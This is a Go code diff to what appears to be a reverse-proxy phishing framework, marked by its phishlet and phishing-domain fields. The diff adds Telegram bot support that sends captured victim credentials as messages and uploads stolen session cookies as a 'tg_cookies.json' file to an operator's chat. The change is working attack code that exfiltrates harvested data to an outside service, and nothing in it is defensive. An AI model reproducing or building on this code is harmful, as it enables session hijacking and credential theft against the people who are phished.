@@ -37,6 +37,7 @@ import (
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
 	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
+	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
 
@@ -82,6 +83,8 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	telegram_bot      *tgbotapi.BotAPI
+	telegram_chat_id  int64
 }
 
 type ProxySession struct {
@@ -90,6 +93,27 @@ type ProxySession struct {
 	PhishDomain  string
 	PhishletName string
 	Index        int
+}
+
+func (p *HttpProxy) NotifyWebhook(msg string) {
+	if p.telegram_bot != nil {
+		creds := tgbotapi.NewMessage(p.telegram_chat_id, msg)
+		if _, err := p.telegram_bot.Send(creds); err != nil {
+			log.Error("failed to send telegram webhook with length %v: %s", len(msg), err)
+		}
+	}
+}
+
+func (p *HttpProxy) SendCookies(msg string) {
+	if p.telegram_bot != nil {
+		cookies := tgbotapi.NewDocumentUpload(p.telegram_chat_id, tgbotapi.FileBytes{
+			Name:  "tg_cookies.json",
+			Bytes: []byte(msg),
+		})
+		if _, err := p.telegram_bot.Send(cookies); err != nil {
+			log.Error("failed to send telegram cookie webhook with length %v: %s", len(msg), err)
+		}
+	}
 }
 
 // set the value of the specified key in the JSON body
@@ -121,6 +145,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
+		telegram_bot:      nil,
 	}
 
 	p.Server = &http.Server{
@@ -138,6 +163,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		} else {
 			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
 		}
+	}
+
+	if len(cfg.webhook_telegram) > 0 {
+		confSlice := strings.Split(cfg.webhook_telegram, "/")
+		if len(confSlice) != 2 {
+			log.Fatal("telegram config not in correct format: <bot_token>/<chat_id>")
+		}
+		bot, err := tgbotapi.NewBotAPI(confSlice[0])
+		if err != nil {
+			log.Fatal("telegram NewBotAPI: %v", err)
+		}
+		p.telegram_bot = bot
+		p.telegram_chat_id, _ = strconv.ParseInt(confSlice[1], 10, 64)
 	}
 
 	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
